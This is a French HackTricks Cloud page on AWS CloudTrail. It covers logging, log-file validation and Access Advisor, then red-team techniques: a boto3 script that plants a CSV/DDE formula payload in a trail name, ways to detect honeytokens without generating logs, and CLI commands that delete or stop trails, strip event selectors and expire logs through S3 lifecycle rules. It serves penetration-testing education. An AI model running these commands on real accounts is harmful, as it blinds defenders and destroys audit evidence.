# AWS - Enum√©ration de CloudTrail

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **CloudTrail**

AWS CloudTrail **enregistre et surveille l'activit√© au sein de votre environnement AWS**. Il capture des **journaux d'√©v√©nements d√©taill√©s**, indiquant qui a fait quoi, quand et d'o√π, pour toutes les interactions avec les ressources AWS. Cela fournit une piste de v√©rification des modifications et des actions, aidant √† l'analyse de s√©curit√©, √† l'audit de conformit√© et au suivi des modifications des ressources. CloudTrail est essentiel pour comprendre le comportement des utilisateurs et des ressources, renforcer les postures de s√©curit√© et garantir la conformit√© r√©glementaire.

Chaque √©v√©nement enregistr√© contient :

* Le nom de l'API appel√©e : `eventName`
* Le service appel√© : `eventSource`
* L'heure : `eventTime`
* L'adresse IP : `SourceIPAddress`
* La m√©thode de l'agent : `userAgent`. Exemples :
  * Signing.amazonaws.com - Depuis la console de gestion AWS
  * console.amazonaws.com - Utilisateur root du compte
  * lambda.amazonaws.com - AWS Lambda
* Les param√®tres de la requ√™te : `requestParameters`
* Les √©l√©ments de r√©ponse : `responseElements`

Les √©v√©nements sont √©crits dans un nouveau fichier journal **environ toutes les 5 minutes dans un fichier JSON**, ils sont conserv√©s par CloudTrail et enfin, les fichiers journaux sont **livr√©s √† S3 environ 15 minutes apr√®s**.\
Les journaux de CloudTrail peuvent √™tre **agr√©g√©s entre les comptes et les r√©gions**.\
CloudTrail permet d'utiliser **l'int√©grit√© des fichiers journaux afin de pouvoir v√©rifier que vos fichiers journaux n'ont pas √©t√© modifi√©s** depuis que CloudTrail vous les a livr√©s. Il cr√©e un hachage SHA-256 des journaux √† l'int√©rieur d'un fichier de synth√®se. Un hachage sha-256 des nouveaux journaux est cr√©√© toutes les heures.\
Lors de la cr√©ation d'une piste, les s√©lecteurs d'√©v√©nements vous permettront d'indiquer la piste √† journaliser : √©v√©nements de gestion, de donn√©es ou d'insights.

Les journaux sont enregistr√©s dans un compartiment S3. Par d√©faut, le chiffrement c√¥t√© serveur est utilis√© (SSE-S3) afin qu'AWS d√©chiffre le contenu pour les personnes qui y ont acc√®s, mais pour une s√©curit√© suppl√©mentaire, vous pouvez utiliser SSE avec KMS et vos propres cl√©s.

Les journaux sont stock√©s dans un **compartiment S3 avec ce format de nom** :

* **`NomDuCompartiment/AWSLogs/IDDuCompte/CloudTrail/NomDeLaR√©gion/YYY/MM/DD`**
* √âtant le NomDuCompartiment : **`aws-cloudtrail-logs-<IDDuCompte>-<al√©atoire>`**
* Exemple : **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

√Ä l'int√©rieur de chaque dossier, chaque journal aura un **nom suivant ce format** : **`IDDuCompte_CloudTrail_NomDeLaR√©gion_YYYYMMDDTHHMMZ_Al√©atoire.json.gz`**

Convention de nommage des fichiers journaux

![](<../../../../.gitbook/assets/image (122).png>)

De plus, les **fichiers de synth√®se (pour v√©rifier l'int√©grit√© des fichiers)** seront dans le **m√™me compartiment** √† :

![](<../../../../.gitbook/assets/image (195).png>)

### Agr√©ger les journaux de plusieurs comptes

* Cr√©ez une piste dans le compte AWS o√π vous souhaitez que les fichiers journaux soient livr√©s
* Appliquez des autorisations au compartiment S3 de destination permettant l'acc√®s inter-comptes pour CloudTrail et autorisez chaque compte AWS qui a besoin d'acc√®s
* Cr√©ez une nouvelle piste dans les autres comptes AWS et s√©lectionnez d'utiliser le compartiment cr√©√© √† l'√©tape 1

Cependant, m√™me si vous pouvez enregistrer tous les journaux dans le m√™me compartiment S3, vous ne pouvez pas agr√©ger les journaux CloudTrail de plusieurs comptes dans des journaux CloudWatch appartenant √† un seul compte AWS.

{% hint style="danger" %}
Rappelez-vous qu'un compte peut avoir **diff√©rentes pistes** de CloudTrail **activ√©es** stockant les m√™mes (ou diff√©rents) journaux dans diff√©rents compartiments.
{% endhint %}

### Cloudtrail de tous les comptes de l'organisation en un seul

Lors de la cr√©ation d'un CloudTrail, il est possible d'indiquer d'activer CloudTrail pour tous les comptes de l'organisation et d'obtenir les journaux dans un seul compartiment :

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

De cette fa√ßon, vous pouvez facilement configurer CloudTrail dans toutes les r√©gions de tous les comptes et centraliser les journaux dans un seul compte (que vous devriez prot√©ger).

### V√©rification des fichiers journaux

Vous pouvez v√©rifier que les journaux n'ont pas √©t√© alt√©r√©s en ex√©cutant

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Journaux vers CloudWatch

**CloudTrail peut automatiquement envoyer des journaux vers CloudWatch afin que vous puissiez d√©finir des alertes qui vous avertissent lorsque des activit√©s suspectes sont effectu√©es.**\
Notez que pour permettre √† CloudTrail d'envoyer les journaux vers CloudWatch, un **r√¥le** doit √™tre cr√©√© pour autoriser cette action. Si possible, il est recommand√© d'utiliser le r√¥le par d√©faut AWS pour effectuer ces actions. Ce r√¥le permettra √† CloudTrail de :

* CreateLogStream : Cela permet de cr√©er des flux de journaux CloudWatch
* PutLogEvents : Livrer les journaux CloudTrail au flux de journaux CloudWatch

### Historique des √©v√©nements

L'historique des √©v√©nements CloudTrail vous permet d'inspecter dans un tableau les journaux qui ont √©t√© enregistr√©s :

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** analyse automatiquement les √©v√©nements de gestion des √©critures des pistes CloudTrail et vous alerte sur une **activit√© inhabituelle**. Par exemple, s'il y a une augmentation des √©v√©nements `TerminateInstance` qui diff√®re des lignes de base √©tablies, vous le verrez comme un √©v√©nement Insight. Ces √©v√©nements rendent la **recherche et la r√©ponse √† une activit√© API inhabituelle plus faciles** que jamais.

Les insights sont stock√©s dans le m√™me compartiment que les journaux CloudTrail dans : `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### S√©curit√©

| Int√©grit√© des fichiers journaux CloudTrail | <ul><li>V√©rifie si les journaux ont √©t√© alt√©r√©s (modifi√©s ou supprim√©s)</li><li><p>Utilise des fichiers de hachage (cr√©e un hachage pour chaque fichier)</p><ul><li>Hachage SHA-256</li><li>SHA-256 avec RSA pour la signature num√©rique</li><li>cl√© priv√©e d√©tenue par Amazon</li></ul></li><li>Prend 1 heure pour cr√©er un fichier de hachage (fait √† l'heure chaque heure)</li></ul> |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Arr√™ter l'acc√®s non autoris√©               | <ul><li><p>Utilisez des strat√©gies IAM et des strat√©gies de compartiment S3</p><ul><li>√©quipe de s√©curit√© ‚Äî> acc√®s administratif</li><li>auditeurs ‚Äî> acc√®s en lecture seule</li></ul></li><li>Utilisez SSE-S3/SSE-KMS pour chiffrer les journaux</li></ul>                                                                                                                                        |
| Emp√™cher la suppression des fichiers journaux | <ul><li>Restreindre l'acc√®s √† la suppression avec les strat√©gies IAM et de compartiment</li><li>Configurer la suppression MFA S3</li><li>Valider avec la validation des fichiers journaux</li></ul>                                                                                                                                                                                            |

## Conseiller en acc√®s

Le conseiller en acc√®s AWS s'appuie sur les **journaux CloudTrail des 400 derniers jours pour recueillir ses informations**. CloudTrail capture un historique des appels d'API AWS et des √©v√©nements associ√©s effectu√©s dans un compte AWS. Le conseiller en acc√®s utilise ces donn√©es pour **indiquer quand les services ont √©t√© acc√©d√©s pour la derni√®re fois**. En analysant les journaux CloudTrail, le conseiller en acc√®s peut d√©terminer quels services AWS un utilisateur IAM ou un r√¥le a acc√©d√© et quand cet acc√®s a eu lieu. Cela aide les administrateurs AWS √† prendre des d√©cisions √©clair√©es sur **l'affinement des autorisations**, car ils peuvent identifier les services qui n'ont pas √©t√© acc√©d√©s pendant des p√©riodes prolong√©es et potentiellement r√©duire les autorisations trop larges en fonction des mod√®les d'utilisation r√©els.

{% hint style="success" %}
Par cons√©quent, le conseiller en acc√®s informe sur **les autorisations inutiles accord√©es aux utilisateurs** afin que l'administrateur puisse les supprimer
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### √ânum√©ration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Injection CSV**

Il est possible d'effectuer une injection CSV dans CloudTrail qui ex√©cutera un code arbitraire si les journaux sont export√©s en CSV et ouverts avec Excel.\
Le code suivant g√©n√©rera une entr√©e de journal avec un mauvais nom de Trail contenant la charge utile :
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Pour plus d'informations sur les injections CSV, consultez la page:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Pour plus d'informations sur cette technique sp√©cifique, consultez [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Contourner la d√©tection**

### Contourner les **HoneyTokens**

Les HoneyTokens sont cr√©√©s pour **d√©tecter l'exfiltration d'informations sensibles**. Dans le cas d'AWS, ce sont des **cl√©s AWS dont l'utilisation est surveill√©e**, si quelque chose d√©clenche une action avec cette cl√©, alors quelqu'un a d√ª voler cette cl√©.

Cependant, des Honeytokens comme ceux cr√©√©s par [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) utilisent soit un nom de compte reconnaissable, soit le m√™me ID de compte AWS pour tous leurs clients. Par cons√©quent, si vous pouvez obtenir le nom du compte et/ou l'ID du compte sans que Cloudtrail cr√©e de journal, **vous pourriez savoir si la cl√© est un HoneyToken ou non**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) a quelques r√®gles pour d√©tecter si une cl√© appartient √† [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** appara√Æt dans le nom du r√¥le ou si l'ID de compte **`534261010715`** appara√Æt dans le message d'erreur.
* En les testant plus r√©cemment, ils utilisent le compte **`717712589309`** et ont toujours la cha√Æne **`canarytokens.com`** dans le nom.
* Si **`SpaceCrab`** appara√Æt dans le nom du r√¥le dans le message d'erreur
* **SpaceSiren** utilise des **uuids** pour g√©n√©rer des noms d'utilisateur : `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si le **nom semble g√©n√©r√© de mani√®re al√©atoire**, il y a de fortes probabilit√©s que ce soit un HoneyToken.

#### Obtenir l'ID du compte √† partir de l'ID de la cl√©

Vous pouvez obtenir l'**ID du compte** √† partir de l'**ID de la cl√© d'acc√®s** **encod√©** comme [**expliqu√© ici**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) et v√©rifier l'ID du compte avec votre liste de comptes AWS Honeytokens:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Consultez plus d'informations dans la [**recherche originale**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Ne g√©n√®re pas de journal

La technique la plus efficace pour cela est en fait assez simple. Utilisez simplement la cl√© que vous venez de trouver pour acc√©der √† un service dans votre propre compte d'attaquant. Cela fera **g√©n√©rer un journal CloudTrail dans VOTRE PROPRE compte AWS et non dans celui de la victime**.

Le point important est que la sortie vous montrera une erreur indiquant l'ID du compte et le nom du compte afin que **vous puissiez voir s'il s'agit d'un Honeytoken**.

#### Services AWS sans journaux

Dans le pass√©, il y avait certains **services AWS qui n'envoient pas de journaux √† CloudTrail** (trouvez une [liste ici](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Certains de ces services **r√©pondront** avec une **erreur** contenant le **ARN du r√¥le cl√©** si quelqu'un non autoris√© (la cl√© honeytoken) essaie d'y acc√©der.

De cette mani√®re, un **attaquant peut obtenir l'ARN de la cl√© sans d√©clencher de journal**. Dans l'ARN, l'attaquant peut voir l'**ID du compte AWS et le nom**, il est facile de conna√Ætre les ID et noms de comptes des entreprises HoneyToken, de cette mani√®re un attaquant peut identifier si le jeton est un HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Notez que toutes les API publiques d√©couvertes comme ne cr√©ant pas de journaux CloudTrail sont maintenant corrig√©es, donc peut-√™tre que vous devez trouver les v√¥tres...

Pour plus d'informations, consultez la [**recherche originale**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Acc√®s √† une infrastructure tierce

Certains services AWS vont **cr√©er une certaine infrastructure** tels que des **bases de donn√©es** ou des **clusters Kubernetes** (EKS). Un utilisateur **communiquant directement avec ces services** (comme l'API Kubernetes) **n'utilisera pas l'API AWS**, donc CloudTrail ne pourra pas voir cette communication.

Par cons√©quent, un utilisateur ayant acc√®s √† EKS et ayant d√©couvert l'URL de l'API EKS pourrait g√©n√©rer un jeton localement et **communiquer directement avec le service API sans √™tre d√©tect√© par CloudTrail**.

Plus d'informations dans :

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modification de la configuration CloudTrail

#### Supprimer les pistes
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Arr√™ter les pistes
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### D√©sactiver l'enregistrement multi-r√©gions

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### D√©sactiver la journalisation par s√©lecteurs d'√©v√©nements

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Dans le premier exemple, un seul s√©lecteur d'√©v√©nement est fourni sous forme de tableau JSON avec un seul objet. Le `"ReadWriteType": "ReadOnly"` indique que le **s√©lecteur d'√©v√©nement ne doit capturer que les √©v√©nements en lecture** (ainsi, les insights de CloudTrail **ne v√©rifieront pas les √©v√©nements d'√©criture** par exemple).

Vous pouvez personnaliser le s√©lecteur d'√©v√©nement en fonction de vos besoins sp√©cifiques.

#### Suppression des journaux via la politique de cycle de vie S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modification de la configuration du bucket

* Supprimer le bucket S3
* Modifier la strat√©gie du bucket pour refuser tout √©crit de la part du service CloudTrail
* Ajouter une strat√©gie de cycle de vie au bucket S3 pour supprimer des objets
* D√©sactiver la cl√© KMS utilis√©e pour chiffrer les journaux CloudTrail

### Ran√ßongiciel CloudTrail

#### Ran√ßongiciel S3

Vous pourriez **g√©n√©rer une cl√© asym√©trique** et faire en sorte que **CloudTrail chiffre les donn√©es** avec cette cl√© et **supprimer la cl√© priv√©e** afin que le contenu de CloudTrail ne puisse pas √™tre r√©cup√©r√©.\
Il s'agit essentiellement d'un **ran√ßongiciel S3-KMS** expliqu√© dans :

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ran√ßongiciel KMS**

Il s'agit d'une mani√®re plus simple d'effectuer l'attaque pr√©c√©dente avec des exigences de permissions diff√©rentes :

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **R√©f√©rences**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
